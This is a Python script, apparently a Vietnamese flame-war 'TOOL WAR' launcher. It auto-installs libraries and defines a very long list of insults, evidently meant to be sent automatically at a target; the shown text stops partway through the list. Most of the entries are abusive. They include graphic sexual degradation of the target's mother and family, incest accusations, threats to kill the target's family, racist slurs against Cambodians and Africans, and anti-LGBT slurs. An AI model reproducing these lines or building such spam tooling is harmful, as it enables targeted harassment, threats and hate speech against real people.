import os, time
# ====== Colors ======
RESET   = "\033[0m"
CYAN    = "\033[36m"
YELLOW  = "\033[33m"
GREEN   = "\033[32m"
MAGENTA = "\033[35m"
RED     = "\033[31m"
# ===== Màu ANSI =====
RESET = "\033[0m"; BOLD  = "\033[1m"
RED   = "\033[31m"; GREEN = "\033[32m"; YEL   = "\033[33m"
BLUE  = "\033[34m"; MAG   = "\033[35m"; CYAN  = "\033[36m"; WHITE = "\033[37m"
xanh_cych_dam = "\033[1;36m"  # Màu bị thiếu trong tool cũ

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def pause(msg="\nNhấn Enter để quay lại menu..."):
    try: input(msg)
    except: pass

# ===== Logo + Info =====
def banner():
    BOLD_ITALIC = "\033[1;3m"
    RESET = "\033[0m"

    print(f"{YELLOW}🔥⚡ === TOOL BÁ === ⚡🔥{RESET}")
    print(f"👑 Admin   : {YELLOW}{BOLD_ITALIC}DucMinhIOS{RESET}")
    print(f"🌐 Facebook: {GREEN}{BOLD_ITALIC}Duc Minhh{RESET}")
    print(f"🚀 Tele    : {MAGENTA}{BOLD_ITALIC}@minhiosfefe{RESET}")
# ===== DÁN CODE TOOL 1 =====
TOOL26_CODE = r"""
# === BEGIN TOOL WAR===

import subprocess
import sys

for module in ["requests", "bs4", "pyfiglet"]:
    try:
        __import__(module)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", module])

import requests
import json
import time
import threading
import re
import os
from bs4 import BeautifulSoup
import pyfiglet
import random 
CAU_CHUI_1 = [
"Sua de",
"Le de",
"Ngu v",
"Co di",
"lgbt xuất trận eii", 
"Le ei",
"Cham v",
"Co de",
"nhạt nhòe v", 
"Cui v",
"tao là bá chủ thiên hạ đấy", 
"=)))))",
"Nhìn mặt mày là thấy 2 chữ phèn ngu😗",
"Đã nghèo đã phèn đã ngu đã dốt mà đòi hơn ai",
"Bản thân mình không làm được cho mình thì làm được cho ai",
"Sống như 1 con chó ngu dốt như lũ phèn ói chợ búa cầm dao múa kiếm",
"Mau ei",
"Cn cho",
"thấy anh nhây bá k", 
"Cha mày chuyên hành lũ đú mà", 
"Cam a",
"thằng sucvat dân tộc miên hay sao mà đen thế", 
"ơ ơ ơ sao em lại hăng ", 
"R nun",
"dân war 2024 hăng ròi kìa ae",
"Cn thú cầm cái phím tắt ôm trong tuyệt vọng hả", 
"Keng cai",
"Ot a",
"Cay cú anh trong lòng mà không làm đc gì🤔🌶❗", 
"Nhìn mặt mày như con tinh tinh đầu thai chuyển kiếp thành con người v🤣", 
"Keng cai",
"Sua le:))",
"Nhìn con dị hợm quá vậy?",
"Con kiếp trước chắc sống phế lắm nhỉ",
"Qua kiếp này làm lại từ đầu mà sao ngu quá v", 
"mạnh mẽ tí đi nà", 
"Tk não vô sinh ngu ngục quỳ lạy bố đê Kiếm ngôn nào sát thương tí dc k", 
"Oc oi",
"M ôm hận ah đến kiếp sau hả🤨", 
"Cn cho",
"Gần quin rồi ráng thêm sí nữa đi", 
"Le dc k",
"Hay bị cha mày bón cho 1 kí hành dô mõm nên không dám sủa nữa", 
"Ngu a",
"Đú sao lại được hả cn ngồi ôm phím gõ dăm ba mấy cái ngôn xưa lắc xưa lơ", 
"Nhanh ti",
"Tk não vô sinh ngu ngục quỳ lạy bố đê kkk", 
"Xng nun",
"ngôn dell có sát thương à", 
"Log jz",
"Ai cứu mày được quả này",
"Cầu cứu lẹ đi🤣",
"Cha hóng nãy giờ nè🤣",
"Nhai a",
"Lgbt bày binh bố trận dồn cha hả🤪❗",
  "Dồn ngu mà cũng đòi dồn❗🦋",
"Camm ha", 
"THANG DOT TU CHI V THOI A? :))", 
"Loan vey",
"nào mày mới bằng được cái móng chân tao á", 
"Chill cai",
"thằng đầu đinh đâu rồi", 
"Dis con m/e may a. May an khong ngoi roi qua, het viec lam nen di chui phai khong? Neu may deo co viec gi lam thi may dat m/e may di ra ngoai duong voi may, xong 2 m/e con tui may lot do nhau ra ma d/j/t nhau giua duong cho do nhan roi. Ngay xua tao deo co viec gi lam nen tao phai hay di qua nha m/e may de ru ba lam tro do kiem tien song qua ngay day. Ve hoi nha hoi m/e may xem có phai nhu the khong nha ",
"Tao nhanh vcl",
"May sao",
"Sao cho cầu cứu mà cầu cứu xog sao kh ai dám dô giúp ht vậy", 
"Len di",
"Cn di",
"úi úi cay cay cay 😜😜😜🤟🤟", 
"Cn me may",
"Le me v", 
"cố gắng mà để win tao nhe",
"tao bất bại mà thằng ngu",
"ẳng hăng vào đi chứ mày ẳng gì mà nhạt nhẽo thế",
"mạnh mẽ lên xem nào",
"kém cỏi thế thằng mồ côi",
"phản kháng êi sao đứng yên chịu trận vậy",
"Oc cho",
"anh ttho mày bá sàn mà🤪👈👈", 
"Cay a", 
"tao trùm ln rồi còn gì mà cãi nữa", 
"cha ttho bắn hét sọt con già m mà 😜😜🔫", 
"Thk c",
"thằng bất tài vô dụng sủa mạnh lên đi", 
"Dui v",
"123 sua",
"Sủa hăng hái lên chứ yếu kém quá cha mày hăng không nổi😉!",
"Gõ phím tắt để làm nét ai xem",
"Mày đi cầu cứu ai hả!?",
"Tao đố đứa nào dám dô cứu mày đấy",
"Đã ngu còn hay tạo nét",
"Cha mày tới là lũ ngu cũm pải dè chừng",
"Đã ngu còn đú thì phế mẹ đi",
"Cha đấng mxh mà🤔!",
"Cưng ganh tị với anh hả?",
"Cưng hăng hái với ai?",
"Sao con đuối rồi hả?",
"Chỉ được vậy thôi hả!",
"Còn chiêu nào không tung ra đi",
"Chứ thấy mấy cái chiêu trò phèn của mày đi trong ruột mày từ 7 kiếp r ",
"Hom nay chị nghe được cái tin đồn thất thoái tuyệt tình con d/i~ bà già mày không có tiền mua băng vệ sinh tới cái thời khắc đỉnh điểm rụng dâu tới tháng t/ử cung âm đạo con d/i/m/e mày chảy huyết canh m/á/u tươi ra như cái sông mê công phân bố chia ngã ra mấy tỉnh đồng bằng sông cửu long nhìn tùm lum sẵn tiện để tao khui cái chuyện năm xưa gia môn mày bán nước theo giặc luôn một thể nha con phản quốc mày nhìn cái thân thể điêu hoa chet đứng trong khói lửa nhả ra cái ngữ nào cũng không đủ khả năng thấm da thấm thịt chị mày không mà lên đây gõ túi bụi rồi thiên hạ nhị vào đánh giá chả ra cái hệ thống gì nghe tin chị gõ cái sớ ngôn thất kinh bát quái như kinh thánh của chúa phân bố cho nhân tộc nghe xong chân tay bủn rủn run như chưa tháo máy run từ cái bàn quan con bóng chos bà già mày cố trụ cho tới ngày tao thuê cái xe rồng đưa tang chôn cất cho con m/e mày làm đám tang nha🤪🤪",
"Bot a",
"May treo a?",
"May ma",
"Con thú ngu dốt bị cha mày hành cho đầu óc quay cuồng r à", 
"Cai thk ngu",
"Cay mếu máo sao khóc rồi", 
"Lam jz",
"Não tàn đến mức phải đi xin tha hả?",
"Não mày chứa toàn cứt của con dog nhà mày à",
"Sao mày không hăng hái nữa",
"Hay rớt rồi hả",
"Sao câm nín rồi 😑",
"Sủa hăng hái máu chiến lên nào",
"Yếu kém v con thú đú ngu êy",
"Sủa sao cho nghe lọt lỗ tai",
"Cha tới nè nhú lên diện kiến cha lẹ",
"Bame mày quỳ lạy kêu anh xin tha mà",
"Cốt cách như buồi gõ xàm gõ điên",
"Gõ sao lại tụi anh được hả lũ đú ",  
"🤣🤣🤣",
"Cay r",
"Thiên truy ngũ giác gõ ra mấy câu như xói xỉa vào trong mặt thiên hạ đang xem mày diễn tuồng lan và điệp đem mấy câu từ này lên với chốn quan tọa như lời tâm thư gửi tới gia môn như lời cảnh báo d/i/m/e mày sắp bị chính đức con mang tên kim ke đẻ ra chôn sống đào nguyệt đạo nhồi nhét vào anh mày thấy mà ngán ngẫm cái cách gắn ghép chữ nghĩa không rành mạch của con mặt l/o/n mày bị anh giải ra pháp trường xử tử công khai cầm cái nồng súng được tỉa bắn sởn da đầu làm cho dân chúng bàng hoàng vì trước mặt anh đây là con yêu quái đang làm xằm làm bậy nguy danh oai phong lẫm liệt khoáy đảo chốn càng khôn cái trình gà mờ tịt ra mà cũng dám lên đây tỉ thí so tài cao thấp khiến tâm trí nó hạn hẹp gõ như đang ói mửa vào chén cơm manh áo của con d/i/m/e nó đi xin ăn la lết cái thân thể đi cầu may vận rủi để về nuôi nó cho nó thất học xấu hổ với bạn bè ở nhà làm nhục nhã gia môn ngũ hầu phong tọa lâu la như mày anh đây vung cao thanh gươm c/h/ặ/t lìa thân thể thành hai khúc thịt tươi dục xuống dưới bên cảng nhà rồng hiện cái thân thể điêu tàn chet điêu đứng của mày lên nhờ sự cứu giúp tương trợ của quan văn tướng võ triều đình mà cũng hô hào tên tuổi khoe mẽ chiến tích bị gõ cho bục đầu cái bao biện lí do như đứa trẻ lên ba đi học bị bạo lục học đường tự kỉ bỏ học đi bán vé số mưu sinh kiếm sống làm cái nghề dơ bẩn của thiên hạ khinh thiên tứ hải💢‼️",
"Cha mày tới là lũ ngu cũm pải rén mà thôi", 
"Hăng lên xíu được không dọ",
"cn thu hoang yeu duoi thieu oxi nen khong cam hung de hang ha cn bede gia trai di lua tinh nguoi dung duong🙄🙄👈", 
"Nín hết rồi hả sao không hăng như ban đầu đê",
"Cưng hăng hái 1 cách bất thường à🤣",
  "Cay cú anh trong lòng mà không làm đc gì🤔🌶",
  "Sao mày ngu như 🐮 v",
  "Cay cay cay cha rồi🤣",
  "Ai cho mày cay cha hả🤣",
  "Cay chừa phần người ta với🤣",
  "Cay ht phần thiên hạ là sao dị🤨",
  "Sao mà xạo l/o/n",
  "Dân va 2024 à",
  "Chỉ có vậy thôi sao",
  "mày làm được gì không😤",
  "hay chỉ biết phản kháng🤭=))",
  "tk cu bé phản kháng di😏?",
  "con đĩ cave luôn khảng phán đi🥺?",
  "bị chửi nên không phản kháng à😀?",
  "sợ anh mày chưa",
  "anh mày bá sàn mà",
  "sao m chối hoài",
  "chối là con má m die",
  "ngu thì ngu vừa thôi=))",
"d/j/t con d/i/m/e mày trơ cái con ngươi tròng trắng đen lẫn lộn khi bị tao cầm đôi đũa sắc chọt duyệt giác mạc thấy cái con l/o/n ốm nhôm ốm nhách bị cha mẹ gia đình bạn bẹ ruồng bỏ cô lập từ năm này sang năm nọ bỏ đói từ ngày này qua tháng nọ không khác con yêu nghiệt ba đầu bảy đuôi thảm sát gia môn kill ba mẹ mày khi ổng bả cố gượng gồng cái sức bình sinh yếu kém của thân già bệnh tật nghèo nàn không tiền chạy căn bệnh ung thư giai đoạn cuối mà còn đi xuống cái cống rãnh móc ổ bánh mì từ bãi rác đem cho mày ăn cứu đói sống qua ngày mà mày lên đây bàn chuyện thiên hạ cái thứ sucvat như mày bị tao hành hình nhốt vào lãnh cung chung với bọn đầu trâu mặt ngựa cho tan thành mây khói vạn kiếp bất phục",
"Can ot a",
"Hieu lun",
"Mày bt anh là chuyên trừng trị những thể loại như m kh", 
"Ngung a", 
"Thấy cha là xách giò chạy hả", 
"Nghi luc len",
"Sua jz",
"Ngồi nhây tới đêm trăng tròn nè=))", 
"=)))))",
"Ai cay v",
"sao thế tk não phẳng",
"Âm binh kìa ae🤣  ",
"Ê thằng đầu đinh  ",
"Ê chx tới tết  ",
"hăng lên con",
"sao m yếu ớt v🌶",
"CÂM LÀ CẢ NHÀ M DIE DƯỚI 💀TAY CHA😣∋⓪①②③( =ノωヽ=)◉‿◉🐮🐮", 
":))))",
"Sao do con",
"Thk beo",
"Lgbt a",
"Lgbt xuất trận hả hay sao 🤔?", 
"Lo lo:))",
"Ei cn bede",
"Mày ngưng là má mày đột tử tới",
"Thú đú như mày làm cha bùn cười quá ",
"Khi nào có trình đú với anh nha",
"Sao chậm quá vậy?😂",
"Sủa hăng hái mạnh mẽ lên",
"Cốt cách thiên nga tâm hồn quỷ dữ 😈",
"Thân tàn ma dại",
"may thi tuoi l/o/n an duoc tao ne on l/o/n la sao ma trau la sao ma hay ma can ngon ngu roi con d/i~ can ngon ngu hay may liet ngon ngu ha con d/i cai l/o/n ba gia con d/i/m/e nha may con d/i~ am binh am khi am l/o/n dai duong dai bang no con ia vo hong l/o/n may nua do thang l/o/n trinh ngu gioi cai sua ngu chuong tai gai mat thi tao dí😏😏",
"Con dốt bame mày đẻ ra con quái thai",
"Si ma",
"Oc c",
"Sao v mặt căng v cay cha rồi hả 🤨🌶?", 
"Le eii",
"Mày bị cha hành mà:3",
"Cha cấm mày bịa chuyện nha🤔",
"Cha quin mà cn thú êy🤪",
"Hóng quin đc cha lắm hỏ🤪",
"Ê cn quái thú🤪",
"Mày là cn quái thú giữa rừng xanh mà🤪",
"phai chang nam xua anh may tram xi mang vao lo am dao nhu dong phong nha cua con d/i/m/e may lai roi, thi nam nay tao da khong met moi trung tri con quai thai lai chos ton tai o duong gian ma khong biet trung thanh voi chu roi vo day but toc nay gio tu phia xoay 180 do cung khong ran ra duoc cau nao hay ho ra tro lan quan may cau nhu l/o/n nha ngon nghe ung thu tai bieng vay ma cung bat chap sua", 
"Sao bị cha chửi mà tha hóa lun r🤪",
"Thk bem",
"Không được cay anh quá mà làm liều nghe chưa!", 
"Dc k v",
"Đuối r thì kêu cha cha tha cho", 
"Đừng có lên mạng xã hội tạo nét mà bị anh hành là mếu máo đi cầu cứu ngay", 
"K ma", 
"Cn ga", 
"Thứ súc sinh muốn tiến hóa thành người",
"Skill cai",
"Cha là chúa thánh🐒🎶 đên đây để bịt mõm mấy tk anh hùng:)))", 
"Oc cho:))",
"Cui v",
"ê wavy giả bộ ngừng đi",
"Gõ ngôn lặp đi lặp lại ngôn 1 màu thì đừng gõ",
"Thứ yêu nghiệt xuống hạn nhân sanh",
"Thk culi",
"Cai thk heo",
"Le boa",
"Ngu v boa",
"Alo con còn sống kh đó", 
"Hay bị hành quá nên sinh ra hoang tưởng", 
"Sua dien eii",
"Chậm chạp như rùa bò v", 
"Sao em",
"chung sinh binh dang, sinhvat ha dang do ban cam len tieng vi deo co quyen ly do hay y kien‼️🤪👈", 
"Ngồi xuống cha giảng đạo cho nghe nè",
"Nghèo bần hèn bị cha mày đứng trên đạp đầu lũ đú chúng mày cha đi lên ",
"Cay mếu máo cha mà chả làm được gì hả",
"Không được quay qua méc mẹ nghe chưa",
"Đã ngu còn thích thể hiện hả thk nhóc",
"Khi nào đủ trình r so với anh nghe chưa",
"Thân phận nghèo hèn đú ai xem",
"Đã ngu còn thích sỉ diện",
"Chó ngoan cục cưng hãy về với chủ đừng cắn bậy",
"Sống sang lên cho nết thanh tịnh",
"Sống dơ sống hèn muôn đời bết",
"Còn sống thì nhú lên đú tiếp cho tụi anh chiêm ngưỡng",
"Tàn tạ từ nhân cách đến não bộ",
"Sống cho cuộc đời có tâm và có tầm",
"Ngu thì đừng phán vs ai nhé cn chó ghẻ ",
"Nghe 1 thời giảng sanh của cha mà tích đức",
"Khi nào con có đủ tầm ảnh hưởng lên đứng với cha",
"thag sucvat bat hieu liem l/o/n me may khen ngon truoc su chung kien cua thag cha may ma oc ngu🤪👈", 
"Thương cho con thú cay anh mà không làm được gì", 
"may la sucsinh phevat top1 MXH ma xao l/o/n boa hoa ngon ngu sucvat cho con d/i/m/e may coi ha em🤨", 
"can canh con mo coi can ba~ liem giai cha de xin tha mang cho c/o/n/d/i/m/e nó nè cac em🤣🤣", 
":)))",
"kho than con chos oc c/a/c cay anh den tan xuong tuy ma dam mom l/o/n dao ly", 
"sucsinh du trinh liem cut anh de song qua ngay ma tuong minh la thiem kim dai tieu thu ha🤨‼️", 
"oc du ma tuong minh la dang MXH gap hw ttho la ngay tan may toi ne em", 
"sucvat kem coi~ ma ao tuong ban than la ba chu son lam hom nay cha ttho chui cho may thoat khoi cai ao mong xam l/o/n do ne🤪❓", 
"ngu si dot nat ma xao l/o/n la con d/i/m/e may cung khong help noi cai mang chos cua may dau em🤪🤪👈", 
" hom nay troi dep mat me cha se bao dung nhe nhang ma ban an tu cho ca nha may die 1 cach the tham🔪🤪👈", 
"bu tinh cha le thi may ra cai mang chos cua may duoc giu lai ma khong bi xuoc", 
"cha ttho dang san ma‼️🤪👈", 
"can canh con oc du meu mao vi bi cha chui ma bat luc khong the phan khang🤣🤣", 
"Mày tưởng mày đang đóng vai ng đẹp và quái vật hả🤪",
"Thoát ra khỏi cái mộng tưởng đó đi nhóc🤪",
"may con cai gi moi hon khong em cu dien mai 1 vai anh may chan loi con c/a/c roi ne cn thu eii🤨‼️", 
" con d/i~ oc bo` bi cha chui ma chi bic cam lang  trong tuyet vong🙄🙄👈", 
"may yeu duoi kem coi toi noi khong bic nhay la gi a thag bem💢🤨❓", 
"can cha day may cach nhay khong do con chos bede nha` la??? ", 
"cha ttho ba san cmnr ke ca con d/i oc ngu bi anh chui con khong dam phan khang", 
"con d/i/m/e may quy lay van xin anh du dieu de tha cho mang chos may ma em", 
"sucvat khong bic dieu bao hieu bame may ma con dam loan luan gia dinh ha thag bat hieu", 
"con d/i/m/e may mang bau 9 thang 10 ngay ma khong ngo con gai m/e may lai de ra con quai thai quai thu bu dai ong hang xom loan luan voi cha ruot... ", 
"khi thuy trieu dang cao cung la luc ca nha may bi anh cam dinh ba tan sat the tham🤪💢", 
"pho nong thon ngon thoi tien su ma dam ngong l/o/n ngua hang cho con d/i/m/e may hui", 
"cn bong nha la bede dau thai chuyen kiep dinh tao net khong may gap cha ttho nen bi chui tet nao khien con bem bi khuyet tat ca doi tan tat tro thanh nguoi thuc vat chi bic om c/a/c nam im 1 cho🤪💢‼️", 
"khuyet tat ngon ngu 4 chi bai liet dau oc chua tinh ma doi so do voi cha ha cn thu hoang🤪🤪",
"hw ttho d/u con d/i/m/e may tet l/o/n ri mau lientuc ma🤪🤪", 
"lu ngu bi cha hanh ha nhu dog giu nha ma sao xao l/o/n dien hai cho anh coi ha❓🤨👈", 
"Sao mấy cn thú đi theo bầy đàn bị cha mày hành tới mức mà pải núp hết rồi dị",
"cn sucvat chos ghe bi anh chui cho tha hoa ma bay dat giay giua xao l/o/n truoc mat cha ttho ha em🤪‼️",
"luc cha xuat tran cung la luc lu oc du ngu boai phai cuoi dau quy lai vi ba khi cua anh qua khung khiep🤣🤣👈", 
"lu bede bai nao dung cay anh qua ma dien loan len can bay nha tr🤪🤣", 
"cn tinh tinh doi lot nhan dan ma tuong minh la phien ban thuong hang sicula hot xoang ha🤣🤣", 
"cn kiki nao tinh trung bi anh chui xuong 18 tang dia nguc khong duoc dau thai chuyen kiep suot doi hau ha dau trau mat ngua nhu no le tinh duc ma", 
"culi chau phi da den nhu cut trau ma dam xao sua tam bay la con d/i/m/e may die the tham", 
"lu ngu bi anh be co tran yem vong hon vao cai quan lot cua con gai m/e may ma", 
"sua diên di ma sua hang len moi vui😘",
"may ma ngung mot giay la con d/i/m/e may ba tat duong tho a", 
"vao 1 hom bong con d/i/m/e nha may die thi luc do cha lam ba chu san m/e r :))",
"do tao qua ba chu thiet ra may cung ngu như chos  =))) ",
"hw ttho trùm đấng mxh ai làm lại anh đâu😁",
"thag sucvat não vô sinh ngu ngục quỳ lạy cha đê =))) ", 
"mày lấy x/a/c chuột nhét vào cái l/o/n m/e mày à??? ", 
" thag rẩu l/o/n chưa ra đời mà đã chơi với cha à😏😏💢", 
"m/e mày còn đang đợi tao đút c/a/c vào l/o/n đó 🤣🤣👈", 
"ME MAY BI ANH KHAU LON NEN PHAI DI DAI BANG LO Đ/Í/T DUNG K???",
"m/e mày bị anh móc l/o/n bắn tung tóe kìa thag bất hiếu", 
"cn d/i/m/e mày bị cha d/j/t tới tấp mà thag sucvat??? ",
"BÁ CHỦ SÀN WAR ĐẤNG MXH GỌI TÊN TTHO🤪🤪",  
"tao lấy l/ô/n/g chim cha l/ô/n/g l/o/n m/e mày cho chos nhai", 
"tao còn cho thag cha mày liếm đ/ý/t đầy c/ứ/t của tao nữa đó💢🤣👈", 
"không được cay cha nha cha mày nói thế thôi chứ lỡ khi mày cay cha thật thì phải làm sao hả đú🤣🤣", 
"cái d/j/t con m/e mày thg ngu ơi mày sủa tao xem di nào , con thú ăn c/ứ/t mxh:))", 
"đáp ngôn nhanh hơn tý đc k thag oc ngu xuẩn🌬 🤢🤢", 
"mày nhắm chơi lại tao không mà dám đú vậy con sucsinh phevat :)))",
"thag ngu khong co nao thay phai gan nao bo` thay the🤣🤣", 
"cai cn khong co dia vi bang 1 cn sucvat nua🤪💢",
"cha may go cho may nguyen 1 tran lan dai hai🤣‼️", 
"go cho may sieu thoat qua the gioi ben kia🤣🤣🤣", 
"Bị cha mày hành nhiều quá nên sính ra hoa tưởng hả 🤨?!",
"Con sống ngu mà con hay tạo nét quá v cn thú ngu êy",
"Nhai hoai",
"ròi lun cn quasi thú bị anh sỉ nhục cn m/e nó ròi kaka🤣",
  "sỉ nhục như cn sucsinh bậc thấp k có địa vị trên cõi đời🤣",
"Đã ngu còn thích tỏ ra mình có trình hả cn thú ngu êy", 
"cn bào thai trong ống nghiệm cũng bic mếu à🤣", 
"cha may hoa than thanh hac bach vo thuong cha may bat hon d/i/m/e may xuong chau diem vuong ne 😜😜🔫",
"sua hang hai len sao di du da du don xao l/o/n tap du mxh"
"dung bi anh chui nhieu qua ma tu ai nhay lau tu tu nhe", 
"con diem pho ma bi cha may cam cai cay cha bon cau cha cha` nat l/o/n may ne",
"sao con du ma con xao l/o/n ha cn thu ngu ey",
"cam la cha may goi hon may nhu goi do"
"con so ho la xao lon bia chuyen ai xem", 
" Thang sucvat oc c/a/c bat hieu giet thang cha d/i m/e may ma🤣🤣❓", 
"nao may bi chen tinh trung cua thang cha may trong ha?",
"con d/i/m/e may bat luc vi bi tao chui ma chi biet cam lang:)))", 
"thang bede ao c/a/c doi can va cai ket:)))",
"con d/i/m/e cua may them cut tao du lam:)))", 
" phevat bi cha chui sang c/a/c deo dam care:)))",
"cham vay sao cuu duoc con d/i/m/e may nhanh len di chu:)))",
"ê nói thật luon thua thì thua đi ai cấm đâu",
"noi voi may moi hon nhap c/u vao l/o/n m/e may",
"mày sủa chill như cách cn chos nhà mày sủa đê🤣",
"bj cha ttho mày đọa đày xuống diêm la địa phủ😗",
  "để đầu thai chuyển kiếp thành sucvat đú war🤣",
"Con may bi t hanh chet len chet xuong ma oc du ao mxh🤣‼️👈",
"may dang tap tanh danh van tung cau tung chu 1 cho tao nghe a tk bede",
"may oc ro ma may xao l/o/n voi cha a con chos ngu", 
"sao may bat luc de anh hanh ha v ha con chos ngu=))) ", 
" bi anh chui den noi con d/i/m/e may dut mong chet di song lai khong kip a",
"khoi co xao l/o/n voi tao dau tk tam hon chos dai may bi anh chui den noi khong kip dau thai a:)))", 
"phevat bai liet 4 chi bi hw ttho duc lientuc khien cn oc ngu bi tham ca l/o/n🤪🤪", 
"d/i/t m/e may len sua di ne m so anh hay gi😏💢", 
"gap hw ttho la lu ngu chi bic vay duoi cui dau quy lay van xin😏😏💢", 
"cha cam dinh ba dam loi cuong hong d/i/m/e may lien", 
"d/i/t con m/e lu du het thoi len day xung danh voi ai??? ", 
" sao may song mat day qua vay bame may kho ma may con luoi‼️❓", 
"the hien minh co trinh di con chos ngu nguc eii💢💢", 
"khi nao co trinh roi do voi anh chu khong trinh ma sua hang ghe ta🤨❓", 
"Khi nào đủ trình r so với anh nghe chưa",
"Thân phận nghèo hèn đú ai xem ",
"d/i/m/e may toi thang xit nuoc mau kinh cho thk cha may uong",
"sua do cha may cam cai choi nhet vo l/o/n may ne",
"Cn thú mại d/â/m bán d/â/m mà như bán trinh hoa hậu v🤣",
"cái thứ con người mà não còn không có mà đòi đọ với ai🤣",
"con d/i~ ngu bi cha chui khong ngoc dau len duoc🤣🤣", 
"thag ngu du bi cha chui khong cho ngoc dau len duoc🤣💢", 
"con chos ngu nguc the hien trinh bi anh sut nat c/a/c🤣🤣", 
"con d/i/m/e may bi may loan luan d/j/t rung cai l/o/n ma🤣‼️", 
"c/a/c chua moc long ma doi du nay du kia🤣🤣👈", 
"nhin thag oc dai ngu dang du bot nhin bua vay🤣❓", 
"eii vo tran duy hung tao thay con d/i/m/e may dung dau duong ngay cho nga tu a😳😳", 
"cha bat bai moi san dau ma thag dai chos 🤣🤣🤖👈👈👈", 
"cụ tổ may co loan luan voi em gai may khong? 🌐", 
"cha chat dai thag cha may cho con d/i/m/e may an ma em🤣🤣👈", 
"khong lam gi duoc anh nen cay a thag nao cho??? ", 
" tao vua d/j/t m/e may vua hat nhu Quang Tho, d/j/t xong roi cam co le tao go mo boong boong, cam co le tao go mo coong coong. ☺",
"may gap tao trung dai len cuong hong roi a🤨💢‼️",
"sao may tham lon cam tao lau nuoc mat k???", 
"con kiki dai tham liem chan anh le =)))🤣🤣‼️",
" con d/i~ cai cun voi cha bi bem rot oc ma 🤣🤣👈",
"cn tinh tinh đội lót nhân dân hại dân lành🤪🔪‼️",
"ai cho mày sủa tao cho mày sủa chưa con d/i~ ngu? ?? ", 
"bị tao chọc cay hơn con chos luôn mà bày đặt xạo l/o/n =)))",
"m/e may bi tao d/j/t dot quy ngoai nha nghi kia dem hom ra vot xac con d/i/m/e may nha🥺🥺💢",
"dem 2 cai may voi con d/i/m/e may luon nha thg bel kkk",
"kham chui vo buom con d/i/m/e no chan keo nup trong a:))))", 
"hinh anh cn bem bi cha dap:)) ui con gie rach‼️🤪👈",
"sao may no dut con c/a/c vao cai l/o/n het tinh dich cua con m/e may vay🤨❓", 
"anh la ac quy phi phai ma, anh cam shot gun ban nat dau con d/i/m/e may luon do tin khong🤣🤣🔫", 
"ban mat l/o/n cua may dinh day cut chos kia lau dum cai di con d/i~ nhin ban vai🤢🤮", 
"thang ngu bi cha chui deo ngoc dau len noi, ngoc len la cha dap nam xuong lai tao thay may cay anh lam roi thang bat hieu", 
"buon cha thang cha voi con d/i/m/e may co 1 dua con beo hinh beo dang nhu con quai thai=))", 
" con d/i/m/e may ngong qua vua ngong vua ngu-))nao nhoi nhet cut hay gi ma deo thong noi cau tao noi?",
"may tin cha may cat con c/a/c thang cha may xeo hang con d/i/m/e may vi cai toi deo biet day con đe con an noi ham ho mat day voi nguoi lon khong?🤗😃",
"Nhìn mày gõ như đống tro tàn cốt mã nhà mày để lại cho mày vậy á",
"gap hw ttho la ngay tan may toi vi luc do cung la luc cha tu hinh may ngay tren dai hanh quyet🤪🤪👈", 
"sao may tham lon cam tao lau nuoc mat k???", 
"mày húp huyết tử cung cn d/i/m/e mày khen béo à sucsinh🤣💢", 
"con kiki dai tham liem chan anh le =)))🤣🤣‼️",
" con d/i~ cai cun voi cha bi bem rot oc ma 🤣🤣👈",
"cn tinh tinh đội lót nhân dân hại dân lành🤪🔪‼️",
"con mo coi bi hw ttho d/j/t rach tu cung ri mau lientuc khong ngung🤣🤣🤣", 
"cn sucvat loan luan gia dinh siet co cha ruot bang day ao nguc😳‼️❓",
"dong cai ngu dao nhai hom nay gap cha la cha go kinh phat xam hoi cho may troi tru dat diet tuyet chung ca pha nha may ne con ngu nguc🤣🤣‼️",
"am binh net re rach tam xich tuong nen xich luon cai l/o/n khai kham cua may ma😳🤣",
"cn sucsinh dia vi chi nhu cn quai thai ha dang ma doi so do voi cha🤣🤣",
"cn sucvat bị HW TTHO hành hạ k bằng 1 con nô lẹ campuchia😳💢", 
"hãy cảm ơn trời vì hôm nay mày dc hw ttho dzs1tg ban án tử nha cn thu🤪🤪👈",
"sát thương tí đi dc kh 😜",
"nhìn mày phèn phèn bẩn bẩn",
"speed x1000 cho anh xem", 
"sao m nghịch tử vậy tk não cao su",
"Cay chua",
"con bede cay dai kieu", 
"Cay ro:))",
"cố lên kkkk gần bại r đó", 
"R x",
"Cha mày tới đâu là lũ đú phải dè chừng",
"Đã ngu còn thích tỏ ra mình có trình hả cn thú ngu êy",
"Bởi vì mày làm gì có trình ?",
"Khi nào có trình r đọ với anh chứ trình không có mà sủa hăng ghê ta", 
"Ot nun",
"Oc nun",
"Duoi a",
"Thk ngu?",
"Sao rồi ổn kh",
"Hay ổn lòi lìa😴😳",
"Nhìn mặt m là bt không ổn r😳",
"Cn tinh tinh bị cha đọa đày😁",
"s v thag ngu?",  
"não m chứa cứt haaa",
"con chos oc c/a/c hăng lẹ lên🙄", 
"úi úi alo aloo", 
"bú c/a/c anh lẹ nè em", 
"ơ ơ s v tròi, dc bú c/a/c hw mà chê???", 
"con d/i~ m/e mày ngu buoi v em", 
"lu~ oc c/a/c sồn anh lẹ lẹ coi🙄👈", 
"im re v chèn ơi phế đến v đó hả😑?",
"Nín hết rồi hả sao không hăng như ban đầu đê", 
"Cha mày tới là lũ ngu cũm pải rén mà thôi", 
"May sua",
"Co le",
"tới sáng đi cục cưng của cha", 
"Alo:)?",
"SUC VAT TINH TRUNG FAKE", 
"lên bem cha đê🤣🤔", 
"Win nha",
"Tao win ma",
"ttho xin win trận này😂🤨", 
"An hoi a",
"Oki tiep ei",
"Le xiu",
"con sugar daddy :)))", 
"CHA CHO M CAM CHUA👉🤣", 
"Cham v",
"th xong nước mắt cả sấu à=))", 
"nhìn mặt m tởm gớm", 
"mặt toàn mụn với rỗ kìa=))", 
"trông mà phát ghê", 
"miệng hôi sữa", 
"vắt mũi ch sạch mà đú war à", 
"Mau ei",
"Cn ga nay",
"xem m trụ đc bao lâu:))", 
"Du a",
"Cn cho cay",
"Met chua",
"Sao mấy cn thú đi theo bầy đàn bị cha mày hành tới mức mà pải núp hết rồi dị", 
"Câm rồi à chán thế",
"Mày nín r hả",
"Sao nín r vậy",
"Hay bị mẹ gank rồi",
"Yếu kém quá cn thú ơi",
"Hay đuối rồi jar",
"Đuối r thì kêu cha cha tha cho",
"Sao pải cuốn cuồng lên thế🤣",
"Ai làm gì mà mếu r v",
"Cay cú kh làm đc gì à",
"Mếu máo rõ mà rồi sao nữa ht ngôn à ",
"=)))",
"Tao nhanh vcl",
"May cham vc:))",
"Thk beo nay",
